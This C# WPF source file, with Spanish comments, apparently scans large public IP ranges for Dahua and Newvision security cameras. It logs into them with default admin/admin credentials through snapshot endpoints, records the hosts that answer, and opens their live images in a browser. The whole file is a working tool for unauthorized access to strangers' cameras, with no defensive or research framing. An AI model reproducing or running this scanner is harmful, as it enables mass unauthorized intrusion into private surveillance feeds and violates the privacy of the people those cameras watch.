using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using RestSharp;
using System.Threading;
using System.Net;
using SnmpSharpNet;
using System.Diagnostics;
using System.Net.Sockets;

namespace TestIP
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            this.DataContext = this;
        }
        //static string ip; 

        private void HttpRequest_Click(object sender, RoutedEventArgs e)
        {
            // Read a text file line by line.            

            string[] lines = File.ReadAllLines("newvision.txt");

            foreach (string ip in lines) {

                if (ip !=null & ip.Length > 1)
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create("http://" + ip + "/tmpfs/auto.jpg");
                        request.Credentials = new NetworkCredential("admin", "admin");
                        //request.Method = "HEAD";
                        request.AllowAutoRedirect = false;
                        request.Timeout = 4000;

                        string mimeType = "image/jpeg";
                        
                        try
                        {
                            HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                            if (response.StatusCode == HttpStatusCode.OK && response.ContentType == mimeType)
                            {
                                Console.WriteLine(ip);
                                //SAVE IP
                                string fileNameDefeway = "newvision-Filtrada-septiembre.txt";
                                using (StreamWriter txt = new StreamWriter(fileNameDefeway, true))
                                {
                                    txt.WriteLine(ip);
                                }
                            }
                            else
                            {
                                Console.WriteLine(ip +" No xiste una camara");
                            }

                        }
                        catch (Exception ee)
                        {
                            Console.WriteLine("Error: " + ip + " " + ee.Message);
                        }
                        
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ip + ex.Message);
                    }
                }               

            }

            Console.WriteLine("FIN");
        }

        public string IpAddress;
        public bool stop = false;
        public int a = 152;
        public int b = 168;
        public int c = 9; //9
        public int d = 0;
        public Thread thAsync { get; set; }
        public Thread thCount { get; set; }
        string mimeType = "image/jpeg";
        string Jpeg = "image/jpeg";
        public int ContadorRequest = 0;
        public int ContadorResponse = 0;
        //public string Title { get; set; } 

        public void Run() 
        {
            int ContadorRequest = 0;
            IpAddress IpAddress = new IpAddress("181.165.45.108");

            while (!stop)
            {

                Console.Write("\r{0}%   ", ContadorRequest);
                ContadorRequest++;

                try
                {

                    RestClient client = new RestClient("http://" + IpAddress);
                    client.FollowRedirects = false;

                    RestRequest request = new RestRequest("/cgi-bin/snapshot.cgi?chn=0&u=admin&p=&q=1");
                    client.ExecuteAsync(request, response =>
                    {
                        ContadorResponse++;

                        if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == mimeType)
                        {
                            Console.WriteLine("Encontrado!");
                            Console.WriteLine(response.ResponseUri.Host);
                            //string fileNameDefeway = "testAsync.txt";
                            //using (StreamWriter txt = new StreamWriter(fileNameDefeway, true))
                            //{
                            //    txt.WriteLine(response.ResponseUri);
                            //}
                        }
                        else
                        {
                            if (response.StatusDescription != null && response.StatusDescription != "Not Found")
                            {

                                Console.WriteLine(response.ResponseUri.Host + " " + response.StatusDescription);
                                //OPEN BROWSER
                                Process.Start("http://" + response.ResponseUri.Host);
                            }

                        }
                    });

                    IpAddress = IpAddress.Increment(1);

                }
                catch (Exception ex)
                {

                    if (ex.Message != "Not Found")
                    {
                        ContadorResponse++;

                        Console.WriteLine(ex.Source + " " + ex.Message);
                    }

                }
            }
        
        }

        public void Count() 
        {
           

            
        
        }

        private void Async_Click(object sender, RoutedEventArgs e)
        {
            thAsync = new Thread(new ThreadStart(this.Run));
            thAsync.Start();

            



           
        }

        private void ProbarRespuestaDeCamara_Click(object sender, RoutedEventArgs e)
        {

            //152.168.108.52
            IPAddress IPAddress = new IPAddress(new byte[] { 152, 168, 108, 52 });

            string ip = IPAddress.ToString();
            
            Console.WriteLine(ip);

            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create("http://" + "152.169.110.144:60001" + "/tmpfs/auto.jpg");
            //request.Credentials = new NetworkCredential("admin", "admin");
            //request.Method = "HEAD";

            string mimeType = "image/jpeg";
            Console.WriteLine(request);
            Console.WriteLine("IpAddress: {0}", IPAddress);

            try
            {
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                if (response.StatusCode == HttpStatusCode.OK && response.ContentType == mimeType)
                {
                    Console.WriteLine("existe");
                    
                }
                else
                {
                    Console.WriteLine("No xiste una camara");
                }   
                
            }
            catch (Exception ee)
            {
                Console.WriteLine("Error: " + ee.Message);
            }
        }

        private void btnIncrementIpAddress_Click(object sender, RoutedEventArgs e)
        {
            //IpAddress IpAddress = new IpAddress("192.168.255.255");            
            //IpAddress = IpAddress.Increment(1);

            IpAddress Ip = new IpAddress("0.0.0.0");
            Console.WriteLine(Ip);
            int length = 4;
            for (int i = 0; i < length; i++)
            {
                Ip = Ip.Increment(65536);
                Console.WriteLine(Ip);
            }
            
        }

        private void btnStop_Click(object sender, RoutedEventArgs e)
        {
            stop = true;
        }

        private void btnScanAll_Click(object sender, RoutedEventArgs e)
        {
            IpAddress Ip = new IpAddress("181.21.0.0");

            while (!stop)
            {
                try
                {                    
                    string BaseUrl = "http://" + Ip;
                    RestClient client = new RestClient(BaseUrl);
                    client.Timeout = 5000;
                    client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
                    RestRequest request = new RestRequest();
                    //request.Credentials = Credentials; //solo newvision  
                    client.ExecuteAsync(request, response =>
                    {
                        if (response.StatusCode == System.Net.HttpStatusCode.OK)
                        {

                            if (!response.Content.Contains("<small>© 2015 Technicolor. All rights reserved. </small>"))
                            {
                                //OPEN BROWSER
                                Process.Start("http://" + response.ResponseUri.Host);
                            }
                            
                        }                       
                    });

                    Ip = Ip.Increment(1);

                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Source + " " + ex.Message);
                }
            }

            Console.WriteLine("DONE!");
        }

        private void BtnDahuaAll_Click(object sender, RoutedEventArgs e)
        {
            
            new Thread(() => Dahua()).Start();


            //while (!stop)
            //{

            //    var IpEnd = Ip.Increment(255 * 10);
            //    //List<IpAddress> Ips = new List<IpAddress>();
            //    //Ips.Clear();

            //    while (!stop && Ip != IpEnd)
            //    {
            //        //Ips.Add(Ip);

            //        try
            //        {
            //            string BaseUrl = "http://" + Ip;
            //            RestClient client = new RestClient(BaseUrl);
            //            client.Timeout = 3000;
            //            client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
            //            RestRequest request = new RestRequest("/cgi-bin/snapshot.cgi?chn=0&u=admin&p=admin&q=1", Method.GET);
            //            request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua

            //            client.ExecuteAsync(request, response =>
            //            {
            //                if (response.StatusCode == System.Net.HttpStatusCode.OK)
            //                {
            //                    Console.WriteLine(response.ResponseUri.Host);
            //                    IsDahua(response.ResponseUri.Host);
            //                }

            //                //if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg && response.ContentLength > 0)
            //                //{
            //                //    //Process.Start("firefox.exe", "http://admin:admin@" + response.ResponseUri.Host + "/cgi-bin/snapshot.cgi");
            //                //}
            //            });                        

            //            Ip = Ip.Increment(1);

            //        }
            //        catch (Exception ex)
            //        {
            //            Console.WriteLine(ex.Source + " " + ex.Message);
            //        }
            //    }

            //    //new Thread(() => Dahua(Ips)).Start();                

            //    int count = 0;

            //    while (count < 40)
            //    {
            //        Thread.Sleep(250);
            //        count++;
            //    }                
            //}           

            //Console.WriteLine("DONE!");
        }

        private void Dahua()
        {
            //    int ResponsesCount = 0;


            //    string BaseUrl = "http://" + "152.171.0.0";
            //    RestClient client = new RestClient(BaseUrl);
            //    client.Timeout = 2000;
            //    client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
            //    RestRequest request = new RestRequest("/cgi-bin/snapshot.cgi?chn=0&u=admin&p=admin&q=1", Method.GET);
            //    request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua

            //    client.ExecuteAsync(request, response =>
            //    {
            //        if (response.StatusCode == System.Net.HttpStatusCode.OK)
            //        {

            //            //if (!response.Content.Contains("<small>© 2015 Technicolor. All rights reserved. </small>"))
            //            //{
            //            //    //OPEN BROWSER
            //            Console.WriteLine(response.ResponseUri.Host);
            //            IsDahua(response.ResponseUri.Host);
            //            //}

            //        }

            //        ResponsesCount++;
            //    });



            //while (!stop)
            //{
            //    Thread.Sleep(500);                
            //}


            //Console.WriteLine("Termino Hilo");

            IpAddress Ip = new IpAddress("181.21.0.0");

            while (!stop)
            {

                var IpEnd = Ip.Increment(255 * 5);
                //List<IpAddress> Ips = new List<IpAddress>();
                //Ips.Clear();

                while (!stop && Ip != IpEnd)
                {
                    //Ips.Add(Ip);

                    try
                    {
                        string BaseUrl = "http://" + Ip;
                        RestClient client = new RestClient(BaseUrl);
                        client.Timeout = 4000;
                        client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
                        RestRequest request = new RestRequest("/cgi-bin/snapshot.cgi?chn=0&u=admin&p=admin&q=1", Method.GET);
                        request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua

                        client.ExecuteAsync(request, response =>
                        {
                            if (response.StatusCode == System.Net.HttpStatusCode.OK)
                            {
                                Console.WriteLine(response.ResponseUri.Host);
                                IsDahua(response.ResponseUri.Host);
                            }

                            //if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg && response.ContentLength > 0)
                            //{
                            //    //Process.Start("firefox.exe", "http://admin:admin@" + response.ResponseUri.Host + "/cgi-bin/snapshot.cgi");
                            //}
                        });

                        Ip = Ip.Increment(1);

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Source + " " + ex.Message);
                    }
                }

                //new Thread(() => Dahua(Ips)).Start();                

                int count = 0;

                while (count < 50)
                {
                    Thread.Sleep(250);
                    count++;
                }
            }

            Console.WriteLine("DONE!");

        }

        private void IsDahua(string Ip)
        {
            string BaseUrl = "http://" + Ip;
            RestClient client = new RestClient(BaseUrl);
            client.Timeout = 10000;
            client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
            RestRequest request = new RestRequest("/cgi-bin/snapshot.cgi?chn=0&u=admin&p=admin&q=1", Method.GET);
            request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua
                        
            IRestResponse response = client.Execute(request);

            if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg && response.ContentLength > 0)
            {                
                Process.Start("firefox.exe", "http://admin:admin@" + response.ResponseUri.Host + "/cgi-bin/snapshot.cgi?chn=0&u=admin&p=admin&q=1");

            }
        }

        private void IsNewvision(string Ip)
        {
            string BaseUrl = "http://" + Ip;
            RestClient client = new RestClient(BaseUrl);
            client.Timeout = 10000;
            client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
            RestRequest request = new RestRequest("/tmpfs/auto.jpg", Method.GET);
            request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua

            IRestResponse response = client.Execute(request);

            if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg && response.ContentLength > 0)
            {
                Process.Start("firefox.exe", "http://admin:admin@" + response.ResponseUri.Host + "/tmpfs/auto.jpg");

            }
        }

        private void Newvision()
        {            

            IpAddress Ip = new IpAddress("152.170.0.0");

            while (!stop)
            {

                var IpEnd = Ip.Increment(255 * 5);
                //List<IpAddress> Ips = new List<IpAddress>();
                //Ips.Clear();

                while (!stop && Ip != IpEnd)
                {
                    //Ips.Add(Ip);

                    try
                    {
                        string BaseUrl = "http://" + Ip;
                        RestClient client = new RestClient(BaseUrl);
                        client.Timeout = 4000;
                        client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
                        RestRequest request = new RestRequest("/tmpfs/auto.jpg", Method.GET);
                        request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua

                        client.ExecuteAsync(request, response =>
                        {
                            if (response.StatusCode == System.Net.HttpStatusCode.OK)
                            {
                                Console.WriteLine(response.ResponseUri.Host);
                                IsNewvision(response.ResponseUri.Host);
                            }

                            //if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg && response.ContentLength > 0)
                            //{
                            //    //Process.Start("firefox.exe", "http://admin:admin@" + response.ResponseUri.Host + "/cgi-bin/snapshot.cgi");
                            //}
                        });

                        Ip = Ip.Increment(1);

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Source + " " + ex.Message);
                    }
                }

                //new Thread(() => Dahua(Ips)).Start();                

                int count = 0;

                while (count < 50)
                {
                    Thread.Sleep(250);
                    count++;
                }
            }

            Console.WriteLine("DONE!");

        }

        private void BtnNewvisionAll_Click(object sender, RoutedEventArgs e)
        {
            new Thread(() => Newvision()).Start();
        }
    }
}
